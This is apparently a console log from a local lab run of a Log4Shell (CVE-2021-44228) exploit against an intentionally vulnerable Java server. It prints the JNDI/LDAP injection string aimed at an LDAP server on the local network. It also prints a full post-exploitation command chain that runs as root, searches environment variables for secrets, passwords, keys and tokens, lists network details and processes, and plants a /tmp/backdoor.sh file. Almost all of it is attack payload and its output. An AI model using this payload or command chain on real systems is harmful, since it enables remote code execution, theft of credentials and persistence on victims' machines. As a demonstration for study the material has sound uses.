Starting VulnerableApp...
Starting VulnerableApp (stderr)...
Vulnerable server listening on port 8080
Vulnerable server listening on port 8080 (stderr)
Received: \${jndi:ldap://192.168.1.100:1389/Exploit}

╔════════════════════════════════════════════════════════════════╗
║          LOG4SHELL EXPLOIT EXECUTING (CVE-2021-44228)         ║
╚════════════════════════════════════════════════════════════════╝

Executing reconnaissance commands as: root
Java Version: 1.8.0_181
OS: Linux 6.17.4-200.fc42.x86_64

--- Command Output Begin ---

=== IDENTITY & PRIVILEGES ===
Current User:
root

User ID & Groups:
uid=0(root) gid=0(root) groups=0(root)

=== FILE SYSTEM ACCESS ===
Current Directory:
/app

Environment Variables (including secrets):
SECRET_VALUE=if you can read this this code is vulnerable

=== NETWORK INFORMATION ===
Hostname:
ibm

Network Interfaces:
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: wlp9s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether f4:a4:75:09:9b:dd brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.100/24 brd 192.168.1.255 scope global noprefixroute dynamic wlp9s0
       valid_lft 79949sec preferred_lft 79949sec
    inet6 2001:2020:4353:986a:1c13:86d3:7859:2/128 scope global noprefixroute dynamic 
       valid_lft 7190sec preferred_lft 3590sec
    inet6 2001:2020:4353:986a:2e98:2ba5:da51:e1d8/64 scope global noprefixroute dynamic 
       valid_lft 7090sec preferred_lft 3490sec
    inet6 fd1c:1386:d378:5900:49d1:804e:e368:64bd/64 scope global noprefixroute dynamic 
       valid_lft 7090sec preferred_lft 3490sec
    inet6 fe80::1558:63ce:d924:b64/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: tailscale0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1280 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 100.75.18.28/32 scope global tailscale0
       valid_lft forever preferred_lft forever
    inet6 fd7a:115c:a1e0::e701:121c/128 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::4a31:6ca1:4dcd:bf62/64 scope link flags 800 
       valid_lft forever preferred_lft forever

=== RUNNING PROCESSES ===
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  3.3  0.2 12163604 67936 ?      Ssl  21:47   0:00 java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j2.formatMsgNoLookups=false -cp /app/app.jar VulnerableApp
root          36  0.0  0.0   4292  1512 ?        S    21:47   0:00 /bin/sh -c echo '=== IDENTITY & PRIVILEGES ===' && echo 'Current User:' && whoami && echo '' && echo 'User ID & Groups:' && id && echo '' && echo '=== FILE SYSTEM ACCESS ===' && echo 'Current Directory:' && pwd && echo '' && echo 'Environment Variables (including secrets):' && env | grep -E '(SECRET|PASSWORD|KEY|TOKEN)' && echo '' && echo '=== NETWORK INFORMATION ===' && echo 'Hostname:' && hostname && echo '' && echo 'Network Interfaces:' && ip addr 2>/dev/null || ifconfig 2>/dev/null || echo 'Network tools not available' && echo '' && echo '=== RUNNING PROCESSES ===' && ps aux | head -10 && echo '' && echo '=== DEMONSTRATING FILE WRITE ===' && echo 'Creating malicious file at /tmp/backdoor.sh' && echo '#!/bin/bash' > /tmp/backdoor.sh && echo 'echo "Persistent backdoor installed!"' >> /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && ls -l /tmp/backdoor.sh
root          44  0.0  0.0  38396  3204 ?        R    21:47   0:00 ps aux
root          45  0.0  0.0   5960  1720 ?        S    21:47   0:00 head -10

=== DEMONSTRATING FILE WRITE ===
Creating malicious file at /tmp/backdoor.sh
-rwxr-xr-x. 1 root root 50 Oct 23 21:47 /tmp/backdoor.sh

--- Command Output End ---

╔════════════════════════════════════════════════════════════════╗
║              EXPLOIT COMPLETED SUCCESSFULLY!                   ║
║  Full output written to: /tmp/PWNED_BY_LOG4SHELL.txt          ║
╚════════════════════════════════════════════════════════════════╝

21:47:44.825 [main] ERROR VulnerableApp - Request: \${jndi:ldap://192.168.1.100:1389/Exploit}
